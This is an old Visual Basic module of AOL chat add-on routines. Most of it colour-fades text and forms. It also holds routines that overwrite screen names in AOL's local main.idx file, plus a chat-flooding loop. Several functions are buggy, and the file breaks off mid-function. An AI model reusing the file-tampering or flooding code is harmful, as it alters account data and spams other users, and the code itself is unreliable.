Attribute VB_Name = "GmansUltra"
' Sup All? This is G man
' I made this for the beginer programmers that
' want to be able to do multiple options without
' having to use more than one bas file.
' The codes are self explanitory, but the fading
' needs to be explained.
' To fade text you need to put this code
' SendChat "" & Colorfade("G man Rulez!")
' PLEASE do not change or copy any of these codes
' unless they do not work anymore. E mail me any
' changes you made so I can put them in future bas'
' Include any info about yourself so I can give you
' Credit
' This is my first .bas file so if there
' are any suggestions or problems please mail me
' at "IHSDogg@Mailexcite.com"





Declare Function IsWindowEnabled Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function ReadProcessMemory Lib "kernel32" (ByVal hProcess As Long, ByVal lpBaseAddress As Long, ByVal lpBuffer As String, ByVal nSize As Long, ByRef lpNumberOfBytesWritten As Long) As Long
Private Declare Function GetWindowThreadProcessId Lib "user32" (ByVal hwnd As Long, lpdwProcessId As Long) As Long
Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Private Declare Sub RtlMoveMemory Lib "kernel32" (ByRef dest As Any, ByRef Source As Any, ByVal nBytes As Long)
Declare Function RedrawWindow Lib "user32" (ByVal hwnd As Long, lprcUpdate As RECT, ByVal hrgnUpdate As Long, ByVal fuRedraw As Long) As Long
Declare Function MoveWindow Lib "user32" (ByVal hwnd As Long, ByVal X As Long, ByVal Y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal bRepaint As Long) As Long
Declare Function GetWindowRect Lib "user32" (ByVal hwnd As Long, lpRect As RECT) As Long
Declare Function SetRect Lib "user32" (lpRect As RECT, ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Declare Function SetParent Lib "user32" (ByVal hWndChild As Long, ByVal hWndNewParent As Long) As Long
Declare Function dwGetStringFromLPSTR Lib "dwspy32.dll" (ByVal lpcopy As Long) As String
Declare Sub dwCopyDataBynum Lib "dwspy32.dll" Alias "dwCopyData" (ByVal Source&, ByVal dest&, ByVal nCount&)
Declare Function dwGetAddressForObject& Lib "dwspy32.dll" (object As Any)
Declare Sub dwCopyDataByString Lib "dwspy32.dll" Alias "dwCopyData" (ByVal Source As String, ByVal dest As Long, ByVal nCount&)
Declare Function dwXCopyDataBynumFrom& Lib "dwspy32.dll" Alias "dwXCopyDataFrom" (ByVal mybuf As Long, ByVal foreignbuf As Long, ByVal size As Integer, ByVal foreignPID As Long)
Declare Function dwGetWndInstance& Lib "dwspy32.dll" (ByVal hwnd&)
Declare Function RegisterWindowMessage& Lib "user32" Alias "RegisterWindowMessageA" (ByVal lpString As String)
Declare Function GetWindowLong& Lib "user32" Alias "GetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long)
Declare Function EnumWindows& Lib "user32" (ByVal lpEnumFunc As Long, ByVal lParam As Long)
Declare Function SendMessageByNum& Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long)
Declare Function GetClassName& Lib "user32" Alias "GetClassNameA" (ByVal hwnd As Long, ByVal lpClassName As String, ByVal nMaxCount As Long)
Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Declare Function DrawMenuBar Lib "user32" (ByVal hwnd As Long) As Long
Declare Function ShellAbout Lib "shell32.dll" Alias "ShellAboutA" (ByVal hwnd As Long, ByVal szApp As String, ByVal szOtherStuff As String, ByVal hIcon As Long) As Long
Declare Function GetParent Lib "user32" (ByVal hwnd As Long) As Long
Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Declare Function SendMessageByString Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As String) As Long
Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Integer, ByVal lParam As Long) As Long
Declare Function CreatePopupMenu Lib "user32" () As Long
Declare Function ShowWindow Lib "user32" (ByVal hwnd As Long, ByVal nCmdShow As Long) As Long
Declare Function GetSubMenu Lib "user32" (ByVal hMenu As Long, ByVal nPos As Long) As Long
Declare Function GetMenuItemID Lib "user32" (ByVal hMenu As Long, ByVal nPos As Long) As Long
Declare Function GetMenu Lib "user32" (ByVal hwnd As Long) As Long
Declare Function GetMenuItemCount Lib "user32" (ByVal hMenu As Long) As Long
Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Declare Function GetTopWindow Lib "user32" (ByVal hwnd As Long) As Long
Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal X As Long, ByVal Y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
Declare Function SetFocusAPI Lib "user32" Alias "SetFocus" (ByVal hwnd As Long) As Long
Declare Function GetMenuString Lib "user32" Alias "GetMenuStringA" (ByVal hMenu As Long, ByVal wIDItem As Long, ByVal lpString As String, ByVal nMaxCount As Long, ByVal wFlag As Long) As Long
Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Declare Function GetWindow Lib "user32" (ByVal hwnd As Long, ByVal wCmd As Long) As Long
Declare Function InsertMenu Lib "user32" Alias "InsertMenuA" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long, ByVal wIDNewItem As Long, ByVal lpNewItem As String) As Long
Declare Function AppendMenu Lib "user32" Alias "AppendMenuA" (ByVal hMenu As Long, ByVal wFlags As Long, ByVal wIDNewItem As Long, ByVal lpNewItem As String) As Long
Declare Function RemoveMenu Lib "user32" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long) As Long
Declare Function DeleteMenu Lib "user32" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long) As Long
Declare Function DestroyMenu Lib "user32" (ByVal hMenu%) As Integer
Declare Function sndPlaySound Lib "winmm.dll" Alias "sndPlaySoundA" (ByVal lpszSoundName As String, ByVal uFlags As Long) As Long

Declare Function EnableWindow Lib "user32" (ByVal hwnd As Long, ByVal cmd As Long) As Long

Global Const GFSR_SYSTEMRESOURCES = 0
Global Const GFSR_GDIRESOURCES = 1
Global Const GFSR_USERRESOURCES = 2

Global Const WM_MDICREATE = &H220
Global Const WM_MDIDESTROY = &H221
Global Const WM_MDIACTIVATE = &H222
Global Const WM_MDIRESTORE = &H223
Global Const WM_MDINEXT = &H224
Global Const WM_MDIMAXIMIZE = &H225
Global Const WM_MDITILE = &H226
Global Const WM_MDICASCADE = &H227
Global Const WM_MDIICONARRANGE = &H228
Global Const WM_MDIGETACTIVE = &H229
Global Const WM_MDISETMENU = &H230


Global Const WM_CUT = &H300
Global Const WM_COPY = &H301
Global Const WM_PASTE = &H302
Public Const WM_CHAR = &H102
Public Const WM_SETTEXT = &HC
Public Const WM_USER = &H400
Public Const WM_KEYDOWN = &H100
Public Const WM_KEYUP = &H101
Public Const WM_LBUTTONDOWN = &H201
Public Const WM_LBUTTONUP = &H202
Public Const WM_CLOSE = &H10
Public Const WM_COMMAND = &H111
Public Const WM_CLEAR = &H303
Public Const WM_DESTROY = &H2
Public Const WM_GETTEXT = &HD
Public Const WM_GETTEXTLENGTH = &HE
Public Const WM_LBUTTONDBLCLK = &H203
Public Const BM_GETCHECK = &HF0
Public Const BM_GETSTATE = &HF2
Public Const BM_SETCHECK = &HF1
Public Const BM_SETSTATE = &HF3

Public Const LB_GETITEMDATA = &H199
Public Const LB_GETCOUNT = &H18B
Public Const LB_ADDSTRING = &H180
Public Const LB_DELETESTRING = &H182
Public Const LB_FINDSTRING = &H18F
Public Const LB_FINDSTRINGEXACT = &H1A2
Public Const LB_GETCURSEL = &H188
Public Const LB_GETTEXT = &H189
Public Const LB_GETTEXTLEN = &H18A
Public Const LB_SELECTSTRING = &H18C
Public Const LB_SETCOUNT = &H1A7
Public Const LB_SETCURSEL = &H186
Public Const LB_SETSEL = &H185
Public Const LB_INSERTSTRING = &H181

Public Const VK_HOME = &H24
Public Const VK_RIGHT = &H27
Public Const VK_CONTROL = &H11
Public Const VK_DELETE = &H2E
Public Const VK_DOWN = &H28
Public Const VK_LEFT = &H25
Public Const VK_RETURN = &HD
Public Const VK_SPACE = &H20
Public Const VK_TAB = &H9

Public Const HWND_TOP = 0
Public Const HWND_TOPMOST = -1
Public Const HWND_NOTOPMOST = -2
Public Const SWP_NOMOVE = &H2
Public Const SWP_NOSIZE = &H1
Public Const FLAGS = SWP_NOMOVE Or SWP_NOSIZE

Global Const SND_SYNC = &H0
Global Const SND_ASYNC = &H1
Global Const SND_NODEFAULT = &H2
Global Const SND_LOOP = &H8
Global Const SND_NOSTOP = &H10

Public Const GW_CHILD = 5
Public Const GW_HWNDFIRST = 0
Public Const GW_HWNDLAST = 1
Public Const GW_HWNDNEXT = 2
Public Const GW_HWNDPREV = 3
Public Const GW_MAX = 5
Public Const GW_OWNER = 4
Public Const SW_MAXIMIZE = 3
Public Const SW_MINIMIZE = 6
Public Const SW_HIDE = 0
Public Const SW_RESTORE = 9
Public Const SW_SHOW = 5
Public Const SW_SHOWDEFAULT = 10
Public Const SW_SHOWMAXIMIZED = 3
Public Const SW_SHOWMINIMIZED = 2
Public Const SW_SHOWMINNOACTIVE = 7
Public Const SW_SHOWNOACTIVATE = 4
Public Const SW_SHOWNORMAL = 1

Public Const MF_APPEND = &H100&
Public Const MF_DELETE = &H200&
Public Const MF_CHANGE = &H80&
Public Const MF_ENABLED = &H0&
Public Const MF_DISABLED = &H2&
Public Const MF_REMOVE = &H1000&
Public Const MF_POPUP = &H10&
Public Const MF_STRING = &H0&
Public Const MF_UNCHECKED = &H0&
Public Const MF_CHECKED = &H8&
Public Const MF_GRAYED = &H1&
Public Const MF_BYPOSITION = &H400&
Public Const MF_BYCOMMAND = &H0&

Public Const GWW_HINSTANCE = (-6)
Public Const GWW_ID = (-12)
Public Const GWL_STYLE = (-16)

Public Const PROCESS_VM_READ = &H10
Public Const STANDARD_RIGHTS_REQUIRED = &HF0000

Type RECT
   Left As Long
   Top As Long
   Right As Long
   Bottom As Long
End Type

Type POINTAPI
   X As Long
   Y As Long
End Type
Sub ChangeCaption(HWD%, newcaption As String)
Call AOLSetText(HWD%, newcaption)
End Sub
Function Chat_RoomName()
Call GetCaption(AOLFindChatRoom)
End Function

'Fade Form codes work best in the Form_paint proc
Sub FadeFormBlue(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(0, 0, 255 - intLoop), B
    Next intLoop
End Sub

Sub FadeFormGreen(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(0, 255 - intLoop, 0), B
    Next intLoop
End Sub

Sub FadeFormGrey(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255 - intLoop, 255 - intLoop, 255 - intLoop), B
    Next intLoop
End Sub


Sub FadeFormPurple(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255 - intLoop, 0, 255 - intLoop), B
    Next intLoop
End Sub
Sub FadeFormRed(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255 - intLoop, 0, 0), B
    Next intLoop
End Sub

Sub FadeFormYellow(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255 - intLoop, 255 - intLoop, 0), B
    Next intLoop
End Sub

Function FindChatRoom()
Aol% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(Aol%, "MDIClient")
room% = FindChildByClass(MDI%, "AOL Child")
Stuff% = FindChildByClass(room%, "_AOL_Listbox")
MoreStuff% = FindChildByClass(room%, "RICHCNTL")
If Stuff% <> 0 And MoreStuff% <> 0 Then
   FindChatRoom = room%
Else:
   FindChatRoom = 0
End If
End Function
Sub FormDance(M As Form)

'  This makes a form dance across the screen
M.Left = 5
Pause (0.1)
M.Left = 400
Pause (0.1)
M.Left = 700
Pause (0.1)
M.Left = 1000
Pause (0.1)
M.Left = 2000
Pause (0.1)
M.Left = 3000
Pause (0.1)
M.Left = 4000
Pause (0.1)
M.Left = 5000
Pause (0.1)
M.Left = 4000
Pause (0.1)
M.Left = 3000
Pause (0.1)
M.Left = 2000
Pause (0.1)
M.Left = 1000
Pause (0.1)
M.Left = 700
Pause (0.1)
M.Left = 400
Pause (0.1)
M.Left = 5
Pause (0.1)
M.Left = 400
Pause (0.1)
M.Left = 700
Pause (0.1)
M.Left = 1000
Pause (0.1)
M.Left = 2000

End Sub


Function r_backwards(strin As String)
'Returns the strin backwards
Let inptxt$ = Text3
Let lenth% = Len(Text3)
Do While numspc% <= lenth%
Let numspc% = numspc% + 1
Let nextChr$ = Mid$(Text3, numspc%, 1)
Let newsent$ = nextChr$ & newsent$
Loop
Text2.AddItem newsent$

End Function

Function r_hacker(strin As String)
'Returns the strin hacker style
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While numspc% <= lenth%
Let numspc% = numspc% + 1
Let nextChr$ = Mid$(inptxt$, numspc%, 1)
If nextChr$ = "A" Then Let nextChr$ = "a"
If nextChr$ = "E" Then Let nextChr$ = "e"
If nextChr$ = "I" Then Let nextChr$ = "i"
If nextChr$ = "O" Then Let nextChr$ = "o"
If nextChr$ = "U" Then Let nextChr$ = "u"
If nextChr$ = "b" Then Let nextChr$ = "B"
If nextChr$ = "c" Then Let nextChr$ = "C"
If nextChr$ = "d" Then Let nextChr$ = "D"
If nextChr$ = "z" Then Let nextChr$ = "Z"
If nextChr$ = "f" Then Let nextChr$ = "F"
If nextChr$ = "g" Then Let nextChr$ = "G"
If nextChr$ = "h" Then Let nextChr$ = "H"
If nextChr$ = "y" Then Let nextChr$ = "Y"
If nextChr$ = "j" Then Let nextChr$ = "J"
If nextChr$ = "k" Then Let nextChr$ = "K"
If nextChr$ = "l" Then Let nextChr$ = "L"
If nextChr$ = "m" Then Let nextChr$ = "M"
If nextChr$ = "n" Then Let nextChr$ = "N"
If nextChr$ = "x" Then Let nextChr$ = "X"
If nextChr$ = "p" Then Let nextChr$ = "P"
If nextChr$ = "q" Then Let nextChr$ = "Q"
If nextChr$ = "r" Then Let nextChr$ = "R"
If nextChr$ = "s" Then Let nextChr$ = "S"
If nextChr$ = "t" Then Let nextChr$ = "T"
If nextChr$ = "w" Then Let nextChr$ = "W"
If nextChr$ = "v" Then Let nextChr$ = "V"
If nextChr$ = "?" Then Let nextChr$ = "¿"
If nextChr$ = " " Then Let nextChr$ = " "
If nextChr$ = "]" Then Let nextChr$ = "]"
If nextChr$ = "[" Then Let nextChr$ = "["
Let newsent$ = newsent$ + nextChr$
Loop
r_hacker = newsent$

End Function

Function RandomNumber(finished)
Randomize
RandomNumber = Int((Val(finished) * Rnd) + 1)
End Function

Sub ResetNew(SN As String, pth As String)
Screen.MousePointer = 11
Static m0226 As String * 40000
Dim l9E68 As Long
Dim l9E6A As Long
Dim l9E6C As Integer
Dim l9E6E As Integer
Dim l9E70 As Variant
Dim l9E74 As Integer
If UCase$(Trim$(SN)) = "NEWUSER" Then MsgBox ("AOL is already reset to NewUser!"): Exit Sub
On Error GoTo no_reset
If Len(SN) < 7 Then MsgBox ("The Screen Name will not work unless it is at least 7 characters, including spaces"): Exit Sub
tru_sn = "NewUser" + String$(Len(SN) - 7, " ")
Let paath$ = (pth & "\idb\main.idx")
Open paath$ For Binary As #1
l9E68& = 1
l9E6A& = LOF(1)
While l9E68& < l9E6A&
    m0226 = String$(40000, Chr$(0))
    Get #1, l9E68&, m0226
    While InStr(UCase$(m0226), UCase$(SN)) <> 0
        Mid$(m0226, InStr(UCase$(m0226), UCase$(SN))) = tru_sn
    Wend
    
    Put #1, l9E68&, m0226
    l9E68& = l9E68& + 40000
Wend

Seek #1, Len(SN)
l9E68& = Len(SN)
While l9E68& < l9E6A&
m0226 = String$(40000, Chr$(0))
    Get #1, l9E68&, m0226
    While InStr(UCase$(m0226), UCase$(SN)) <> 0
        Mid$(m0226, InStr(UCase$(m0226), UCase$(SN))) = tru_sn
        Wend
    Put #1, l9E68&, m0226
    l9E68& = l9E68& + 40000
Wend
Close #1
Screen.MousePointer = 0
no_reset:
Screen.MousePointer = 0
Exit Sub
Resume Next

End Sub

Function ScrambleText(thetext)
'sees if there's a space in the text to be scrambled,
'if found space, continues, if not, adds it
findlastspace = Mid(thetext, Len(thetext), 1)

If Not findlastspace = " " Then
thetext = thetext & " "
Else
thetext = thetext
End If

'Scrambles the text
For scrambling = 1 To Len(thetext)
thechar$ = Mid(thetext, scrambling, 1)
Char$ = Char$ & thechar$

If thechar$ = " " Then
'takes out " " space from the text left of the space
chars$ = Mid(Char$, 1, Len(Char$) - 1)
'gets first character
firstchar$ = Mid(chars$, 1, 1)
'gets last character (if not, makes first character only)
On Error GoTo cityz
lastchar$ = Mid(chars$, Len(chars$), 1)
'Full bas by eLeSsDee == eLeSsDee@mindless.com
'finds what is inbetween the last and first character
midchar$ = Mid(chars$, 2, Len(chars$) - 2)
'reverses the text found in between the last and first
'character
For SpeedBack = Len(midchar$) To 1 Step -1
backchar$ = backchar$ & Mid$(midchar$, SpeedBack, 1)
Next SpeedBack
GoTo sniffe

'adds the scrambled text to the full scrambled element
cityz:
Scrambled$ = Scrambled$ & firstchar$ & " "
GoTo sniffs

sniffe:
Scrambled$ = Scrambled$ & lastchar$ & firstchar$ & backchar$ & " "

'clears character and reversed buffers
sniffs:
Char$ = ""
backchar$ = ""
End If

Next scrambling
'Makes function return value the scrambled text
ScrambleText = Scrambled$

Exit Function
End Function



Sub ToChat(Chat)
room% = FindChatRoom
AORich% = FindChildByClass(room%, "RICHCNTL")

AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)

Call SetFocusAPI(AORich%)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, Chat)
DoEvents
Call SendMessageByNum(AORich%, WM_CHAR, 13, 0)
End Sub
Sub AOLSNReset(SN$, aoldir$, Replace$)
l0036 = Len(SN$)
Select Case l0036
Case 3
i = SN$ + "       "
Case 4
i = SN$ + "      "
Case 5
i = SN$ + "     "
Case 6
i = SN$ + "    "
Case 7
i = SN$ + "   "
Case 8
i = SN$ + "  "
Case 9
i = SN$ + " "
Case 10
i = SN$
End Select
l0036 = Len(Replace$)
Select Case l0036
Case 3
Replace$ = Replace$ + "       "
Case 4
Replace$ = Replace$ + "      "
Case 5
Replace$ = Replace$ + "     "
Case 6
Replace$ = Replace$ + "    "
Case 7
Replace$ = Replace$ + "   "
Case 8
Replace$ = Replace$ + "  "
Case 9
Replace$ = Replace$ + " "
Case 10
Replace$ = Replace$
End Select
X = 1
Do Until 2 > 3
Text$ = ""
DoEvents
On Error Resume Next
Open aoldir$ + "\idb\main.idx" For Binary As #1
If Err Then Exit Sub
Text$ = String(32000, 0)
Get #1, X, Text$
Close #1
Open aoldir$ + "\idb\main.idx" For Binary As #2
Where1 = InStr(1, Text$, i, 1)
If Where1 Then
Mid(Text$, Where1) = Replace$
ReplaceX$ = Replace$
Put #2, X + Where1 - 1, ReplaceX$
401:
DoEvents
Where2 = InStr(1, Text$, i, 1)
If Where2 Then
Mid(Text$, Where2) = Replace$
Put #2, X + Where2 - 1, ReplaceX$
GoTo 401
End If
End If
X = X + 32000
LF2 = LOF(2)
Close #2
If X > LF2 Then GoTo 301
Loop
301:
End Sub




Sub SpiralScroll(txt As TextBox)
X = txt.Text
thastar:
Dim MYLEN As Integer
MYSTRING = txt.Text
MYLEN = Len(MYSTRING)
MYSTR = Mid(MYSTRING, 2, MYLEN) + Mid(MYSTRING, 1, 1)
txt.Text = MYSTR
SendChat "•[" + X + "]•"
If txt.Text = X Then
Exit Sub
End If
GoTo thastar

End Sub



Sub Attention(thetext As String)

SendChat ("¸¸.‹^›.¸¸ ATTENTION ¸¸.‹^›.¸¸")
Call TimeOut(0.15)
SendChat "<b>" & BlackRedBlack(thetext)
Call TimeOut(0.15)
SendChat ("¸¸.‹^›.¸¸ ATTENTION ¸¸.‹^›.¸¸")
Call TimeOut(0.15)
End Sub
Function Black_LBlue(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 255 / a
        F = e * b
        G = RGB(F, F, F - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    Black_LBlue = msg
End Function
Function Black_LBlue_Black(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 510 / a
        F = e * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, F, F - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    Black_LBlue_Black = msg
End Function


Function BlackGrey(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 200 / a
        F = e * b
        G = RGB(F, F, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    BlackGrey = msg
End Function


Function BlackGreyBlack(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 490 / a
        F = e * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, F, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    BlackGreyBlack = msg
End Function
Function BlackPurple(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 255 / a
        F = e * b
        G = RGB(F, 0, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    BlackPurple = msg
End Function
Function BlackPurpleBlack(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 510 / a
        F = e * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, 0, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    BlackPurpleBlack = msg
End Function
Function BlackRed(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 255 / a
        F = e * b
        G = RGB(0, 0, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    BlackRed = msg
End Function
Function BlackRedBlack(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 510 / a
        F = e * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, 0, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    BlackRedBlack = msg
End Function

Function BlackYellow(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 255 / a
        F = e * b
        G = RGB(0, F, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    BlackYellow = msg
End Function
Function BlackYellowBlack(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 510 / a
        F = e * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, F, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    BlackYellowBlack = msg
End Function
Function BlueBlack(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 255 / a
        F = e * b
        G = RGB(255 - F, 0, 0)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    BlueBlack = msg
End Function

Function BlueBlackBlue(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 510 / a
        F = e * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 0, 0)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    BlueBlackBlue = msg
End Function


Function BlueGreen(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 255 / a
        F = e * b
        G = RGB(255 - F, F, 0)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    BlueGreen = msg
End Function

Function BlueGreenBlue(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 510 / a
        F = e * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, F, 0)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    BlueGreenBlue = msg
End Function
Function BluePurple(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 255 / a
        F = e * b
        G = RGB(255, 0, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    BluePurple = msg
End Function
Function BluePurpleBlue(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 510 / a
        F = e * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255, 0, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    BluePurpleBlue = msg
End Function

Function BlueRed(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 255 / a
        F = e * b
        G = RGB(255 - F, 0, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    BlueRed = msg
End Function
Function BlueRedBlue(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 510 / a
        F = e * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 0, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    BlueRedBlue = msg
End Function


Function BlueYellow(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 255 / a
        F = e * b
        G = RGB(255 - F, F, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    BlueYellow = msg
End Function

Function BlueYellowBlue(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 510 / a
        F = e * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, F, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    BlueYellowBlue = msg
End Function
Public Sub CenterFormTop(frm As Form)
' This will center your form in the middle of the
' screen, and on the upper part.
' to use type - CenterFormTop Me ( in form_load )
   With frm
      .Left = (Screen.Width - .Width) / 2
      .Top = (Screen.Height - .Height) / (Screen.Height)
   End With
End Sub
Function DBlue_Black(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 255 / a
        F = e * b
        G = RGB(255 - F, 0, 0)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    DBlue_Black = msg
End Function
Function DBlue_Black_DBlue(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 450 / a
        F = e * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 0, 0)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    DBlue_Black_DBlue = msg
End Function
Function DGreen_Black(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 255 / a
        F = e * b
